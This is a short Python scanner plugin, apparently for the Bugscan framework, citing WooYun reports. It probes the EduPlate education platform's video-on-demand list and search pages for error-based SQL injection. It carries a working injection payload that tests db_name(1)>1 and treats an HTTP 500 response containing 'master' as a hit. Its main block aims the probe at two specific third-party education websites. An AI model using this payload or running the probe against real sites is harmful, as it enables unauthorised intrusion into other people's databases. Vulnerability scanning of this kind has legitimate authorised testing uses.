#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105271
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105268

def assign(service, arg):
    if service == "eduplate":
        return True, arg

def audit(arg):
    payloads = [
        'EduPlate/VideoOnDemand/list.aspx?SID=0&KEYwordType=1&nKeyword=11',
        'EduPlate/VideoOnDemand/Web/search.aspx?nKeyword='
        ]
    getdata = '%%27%20and%20db_name%281%29%3E1--'
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(arg+payload+getdata)
        if code ==500 and 'master' in res:
            security_hole(arg+payload+" :sql Injection")


if __name__ == '__main__':
    from dummy import *
    audit(assign('eduplate', 'http://i.goodo.com.cn/')[1])
    audit(assign('eduplate', 'http://tywx.mhedu.sh.cn/')[1])